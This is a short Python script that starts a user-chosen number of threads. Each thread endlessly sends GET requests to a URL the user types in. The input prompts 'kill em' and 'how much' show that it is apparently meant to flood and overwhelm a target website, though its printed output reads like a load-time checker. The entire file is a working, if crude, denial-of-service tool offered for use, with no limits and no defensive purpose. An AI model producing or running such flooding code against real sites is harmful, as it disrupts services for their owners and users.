import time
import threading
import requests

def connect_to_website(url):
  while True:
    r0 = time.time()
    r1 = requests.get(url)
    j34 = time.time()
    r2 = requests.get(url)
    b6 = time.time()

    e1 = j34 - r0
    e2 = b6 - j34
    print(f'The website took {e1:.2f} seconds to load.')
    print(f'The website took {e2:.2f} seconds to load.')
    print(f"Connected to {url} with status code: {r1.status_code}")
    print(f"Connected to {url} with status code: {r2.status_code}")

def main(num_threads, url):
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=connect_to_website, args=(url,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

if __name__ == '__main__':
    print("woooowooooowwowowooooww")
    b5 = input("kill em ")
    z1 = input("how much ")
    z2 = int(z1)
    url = b5
    main(z2, url)
